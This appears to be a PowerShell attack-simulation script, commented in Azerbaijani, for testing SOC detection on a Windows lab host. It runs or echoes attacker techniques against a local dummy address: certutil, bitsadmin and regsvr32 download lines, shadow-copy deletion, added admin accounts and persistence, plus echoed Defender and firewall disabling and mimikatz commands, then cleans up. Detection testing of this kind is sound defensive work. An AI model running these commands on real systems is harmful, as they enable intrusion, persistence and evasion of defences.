#Requires -RunAsAdministrator
# SOC lab - TEHLUKESIZ hucum simulyasiyasi (Windows host). Hec bir zererli emeliyyat icra edilmir:
#  - zererli komandalar yalniz "echo" ile komanda setrinde gorunur, mövcud olmayan hedefe yönlendirilir ve ya
#    lab ucun yaradilan test obyektleri (soclabtest, SOCTest) sonda silinir.
# Istifade (PowerShell, Administrator):  powershell -ExecutionPolicy Bypass -File attack_sim.ps1
$ErrorActionPreference = 'Continue'
New-Item -ItemType Directory -Force C:\SOC_Backup | Out-Null
$log = "C:\SOC_Backup\attack_sim_$(Get-Date -Format yyyyMMdd_HHmmss).log"

function Run($file, $arg, $wait = 8000) {
    if ($arg) { $p = Start-Process -FilePath $file -ArgumentList $arg -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue }
    else      { $p = Start-Process -FilePath $file -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue }
    if ($p) { if (-not $p.WaitForExit($wait)) { try { $p.Kill() } catch {} } }
}
function Step($id, $name, [scriptblock]$sb) {
    $m = "[{0}] {1}  {2}" -f (Get-Date -Format 'HH:mm:ss'), $id, $name
    Write-Host $m -ForegroundColor Cyan; Add-Content $log $m
    try { & $sb *> $null } catch {}
    Start-Sleep -Seconds 3
}

Write-Host "=== SOC attack simulation baslayir (log: $log) ===" -ForegroundColor Yellow
Step 'W01/E01' 'PowerShell -enc'            { Run 'powershell.exe' '-NoProfile -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAbwBjACcA' }
Step 'W02/E04' 'certutil -urlcache'          { Run 'certutil.exe' "-urlcache -split -f http://127.0.0.1:9/soc.txt $env:TEMP\soc.txt" }
Step 'W03'     'bitsadmin /transfer'         { Run 'bitsadmin.exe' "/transfer soclab /download /priority low http://127.0.0.1:9/x $env:TEMP\x.tmp" 4000; Run 'bitsadmin.exe' '/cancel soclab' }
Step 'W04'     'mshta vbscript'              { Run 'mshta.exe' 'vbscript:Close(Execute("x=1"))' 6000 }
Step 'W05'     'regsvr32 scrobj'             { Run 'regsvr32.exe' '/s /n /u /i:http://127.0.0.1:9/x.sct scrobj.dll' }
Step 'W06'     'vssadmin delete shadows (Z: yoxdur)' { Run 'vssadmin.exe' 'delete shadows /for=Z: /quiet' }
Step 'W07'     'wevtutil cl (log yoxdur)'    { Run 'wevtutil.exe' 'cl SOCNoSuchLog' }
Step 'W08/E06' 'net user /add (4720)'        { Run 'net.exe' 'user soclabtest S0cLab!2026x /add' }
Step 'W09'     'net localgroup Administrators /add (4732)' { Run 'net.exe' 'localgroup Administrators soclabtest /add' }
Step 'W10/E03' 'schtasks /create'            { Run 'schtasks.exe' '/create /tn SOCTest /tr cmd.exe /sc once /st 23:59 /f' }
Step 'W11'     'sc create'                   { Run 'sc.exe' 'create SOCTestSvc binPath= "C:\Windows\System32\cmd.exe"' }
Step 'W12/E08' 'Run key (HKCU)'              { Run 'reg.exe' 'add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SOCTest /t REG_SZ /d C:\Windows\System32\calc.exe /f' }
Step 'W13'     'WMI spawned cmd'             { Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c echo soc' } }
Step 'W14'     'net user / localgroup'       { Run 'net.exe' 'user'; Run 'net.exe' 'localgroup administrators' }
Step 'W15'     'whoami /priv + systeminfo'   { Run 'whoami.exe' '/priv'; Run 'systeminfo.exe' '' 25000 }
Step 'W16'     'Defender tamper (yalniz echo)'  { Run 'cmd.exe' '/c echo Set-MpPreference -DisableRealtimeMonitoring $true' }
Step 'W17'     'Firewall off (yalniz echo)'     { Run 'cmd.exe' '/c echo netsh advfirewall set allprofiles state off' }
Step 'W18'     'mimikatz keyword (yalniz echo)' { Run 'cmd.exe' '/c echo sekurlsa::logonpasswords' }
Step 'W19'     'PowerShell download cradle (yuklenme yoxdur)' { Run 'powershell.exe' '-NoProfile -Command "echo (New-Object Net.WebClient).DownloadString"' }
Step 'W20/E02' '6 ugursuz giris (4625)'      { 1..6 | ForEach-Object { Run 'net.exe' 'use \\127.0.0.1\IPC$ /user:soclabbad WrongPass123' 6000; Start-Sleep -Milliseconds 700 } }
Step 'W21'     'EXE Temp-de'                 { Copy-Item "$env:SystemRoot\System32\whoami.exe" "$env:TEMP\socupdate.exe" -Force }
Step 'E10'     'Uzun DNS sorgusu (tunneling)' { Resolve-DnsName (("a" * 40) + "." + ("b" * 40) + ".example.com") -ErrorAction SilentlyContinue }

Write-Host "=== TEMIZLIK ===" -ForegroundColor Yellow
Run 'net.exe' 'user soclabtest /delete'
Run 'schtasks.exe' '/delete /tn SOCTest /f'
Run 'sc.exe' 'delete SOCTestSvc'
Run 'reg.exe' 'delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SOCTest /f'
Run 'bitsadmin.exe' '/cancel soclab'
Remove-Item "$env:TEMP\socupdate.exe", "$env:TEMP\soc.txt", "$env:TEMP\x.tmp" -Force -ErrorAction SilentlyContinue
Write-Host "Bitdi. Test obyektleri silindi. 60 saniye sonra WSL-de: python3 deploy/check_alerts.py 15" -ForegroundColor Green
Add-Content $log "BITDI $(Get-Date -Format 'HH:mm:ss')"
